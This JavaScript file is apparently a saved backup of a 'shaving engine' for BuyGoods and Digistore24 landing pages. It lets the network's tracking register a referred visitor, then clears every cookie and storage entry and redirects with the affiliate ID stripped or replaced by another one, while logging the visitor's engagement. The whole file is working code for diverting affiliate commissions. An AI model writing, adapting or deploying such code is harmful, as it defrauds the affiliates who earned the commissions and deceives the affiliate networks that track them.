/**
 * BuyGoods Shaving Engine v2 — Cookie-based with full redirect
 * BACKUP of the 4-step approach (saved 2026-03-13)
 *
 * Flow:
 * 1. Inject BG tracking with ORIGINAL dirty aff_id → BG sets sessid2 cookie
 * 2. Poll until cookies stabilize (waitForCookiesThenClean)
 * 3. Clear ALL cookies (sessid2, etc.) + localStorage/sessionStorage
 * 4. Save pre-redirect engagement snapshot → full page redirect with params stripped/replaced
 * 5. Post-redirect: alreadyCleaned flag prevents loop, BG re-injects as direct visit
 *
 * Creates TWO traffic records: pre-shave (was_shaved=1) + post-redirect (was_shaved=0)
 */

// ============================================================
// COOKIE POLL → CLEAR → REDIRECT (the core shaving mechanism)
// ============================================================
function waitForCookiesThenClean(session) {
    _log('%c[Shaver] Step 1: BG tracking injected — waiting for cookies to stabilize...', 'color:#f39c12;font-weight:bold');

    var elapsed    = 0;
    var lastCount  = -1;
    var stableTime = 0;
    var STABLE_MS  = STABLE_SECS * 1000;

    var watcher = setInterval(function() {
        elapsed += POLL_MS;
        var cnt = cookieCount();

        if (cnt > 0 && cnt === lastCount) {
            stableTime += POLL_MS;
            _log('[Shaver] Cookies: ' + cnt + ' — stable ' + (stableTime / 1000).toFixed(1) + 's / ' + STABLE_SECS + 's');
        } else {
            if (cnt !== lastCount && lastCount !== -1) {
                _log('[Shaver] Cookie count changed: ' + lastCount + ' → ' + cnt);
            }
            stableTime = 0;
        }
        lastCount = cnt;

        var shouldProceed = (stableTime >= STABLE_MS && cnt > 0) || (elapsed >= MAX_WAIT_MS);

        if (shouldProceed) {
            clearInterval(watcher);
            if (stableTime >= STABLE_MS) {
                _log('%c[Shaver] Step 2: Cookies stable at ' + cnt + ' for ' + STABLE_SECS + 's!', 'color:#2ecc71;font-weight:bold');
            } else {
                _log('%c[Shaver] Step 2: Timeout after ' + (elapsed / 1000) + 's — proceeding with ' + cnt + ' cookies', 'color:#f39c12;font-weight:bold');
            }
            performCleanAndRedirect(session);
        }
    }, POLL_MS);
}

function performCleanAndRedirect(session) {
    // ── Capture BEFORE snapshot and send to server (matched by snap_token in URL) ──
    var snapToken = generateSnapToken();
    var beforeSnap = captureSnapshot();
    sendBeforeSnapshot(beforeSnap, session, snapToken);

    // Step 3: Clear all cookies
    _log('%c[Shaver] Step 3: Clearing ALL cookies...', 'color:#e74c3c;font-weight:bold');

    if (PLATFORM === 'digistore24') {
        clearDS24Cookies();
        clearDS24Storage();
    }
    clearAllCookies();

    // Save pre-redirect engagement snapshot for before/after comparison
    var preEngagement = {
        duration: Math.floor((Date.now() - window.__behaviorTracking.landedAt) / 1000),
        scrollDepth: window.__behaviorTracking.maxScrollDepth,
        redirectClicks: window.__behaviorTracking.redirectClicks,
        buynowClicks: window.__behaviorTracking.buynowClicks,
        footerClicks: window.__behaviorTracking.footerClicks,
        totalClicks: window.__behaviorTracking.clickCount,
        firstClickTime: window.__behaviorTracking.firstClickTime ? Math.floor((window.__behaviorTracking.firstClickTime - window.__behaviorTracking.landedAt) / 1000) : null,
        redirectTimeMs: Date.now() - window.__behaviorTracking.landedAt
    };

    // Set flag to prevent loop + save scroll position for seamless restore
    try {
        sessionStorage.setItem(SHAVER_FLAG, '1');
        sessionStorage.setItem('_shaver_scrollY', String(window.scrollY || window.pageYOffset || 0));
        sessionStorage.setItem('_shaver_pre_engagement', JSON.stringify(preEngagement));
    } catch(e) {}

    // Step 4: Build redirect URL
    var url = new URL(window.location.href);

    if (session.replaceMode) {
        url.searchParams.set('aff_id', session.replaceAffId);
        if (session.replaceSubId) url.searchParams.set('subid', session.replaceSubId);
        else url.searchParams.delete('subid');
        url.searchParams.delete('sub_id');
        url.searchParams.delete('subid2');
        url.searchParams.delete('subid3');
        url.searchParams.delete('sub_id2');
        url.searchParams.delete('sub_id3');
        url.searchParams.delete('affid');
        _log('%c[Shaver] Step 4: Redirecting with REPLACED params → aff: ' + session.replaceAffId, 'color:#f39c12;font-weight:bold');
    } else {
        url.searchParams.delete('aff_id');
        url.searchParams.delete('affid');
        url.searchParams.delete('subid');
        url.searchParams.delete('sub_id');
        url.searchParams.delete('subid2');
        url.searchParams.delete('subid3');
        url.searchParams.delete('sub_id2');
        url.searchParams.delete('sub_id3');
        _log('%c[Shaver] Step 4: Redirecting with CLEAN URL (affiliate removed)', 'color:#e74c3c;font-weight:bold');
    }

    // Add snap token to URL for after-snapshot matching (no storage needed)
    url.searchParams.set('_sst', snapToken);

    _log('[Shaver] Redirect URL:', url.toString());
    window.location.href = url.toString();
}

// ============================================================
// MAIN LOGIC — BuyGoods section
// ============================================================
if (PLATFORM === 'buygoods') {
    _log('%c[Shaver] ═══ BuyGoods Engine Started ═══', 'color:#3498db;font-weight:bold;font-size:12px');
    var affId = params.aff_id || params.affid || '';
    var subId = params.subid || params.sub_id || '';

    if (PAGE_TYPE !== 'landing') {
        // UPSELL / THANK YOU — skip shaving, just log
        if (!affId) {
            try { affId = sessionStorage.getItem('_shaver_aff_id') || ''; } catch(e) {}
            try { subId = subId || sessionStorage.getItem('_shaver_sub_id') || ''; } catch(e) {}
        }
        logTraffic(affId, subId, false, null, utmSource);

    } else if (alreadyCleaned) {
        // POST-REDIRECT CLEAN VISIT — BG tracks normally
        logTraffic(affId, subId, false, null, utmSource);

    } else if (affId) {
        // LANDING PAGE WITH AFF_ID — check for shaver match
        try {
            sessionStorage.setItem('_shaver_aff_id', affId);
            sessionStorage.setItem('_shaver_sub_id', subId);
        } catch(e) {}

        var session = findSession(affId, subId);

        if (session) {
            // ██ SHAVER MATCH! ██
            logTraffic(affId, subId, true, session.id, utmSource);
            trackVisit(session, affId, subId);

            window.__shavingSession = session;
            window.__shavingOriginalAffId = affId;
            window.__shavingOriginalSubId = subId;

            // Step 1: Inject BG tracking with ORIGINAL URL (dirty aff_id)
            injectBGTracking();

            // Steps 2-4: Wait for cookies to stabilize → clear → redirect
            waitForCookiesThenClean(session);

            window.__shavingLoaded = true;
            return; // Exit IIFE — redirect will handle the rest
        } else {
            logTraffic(affId, subId, false, null, utmSource);
        }
    } else {
        logTraffic('', '', false, null, utmSource);
    }
}
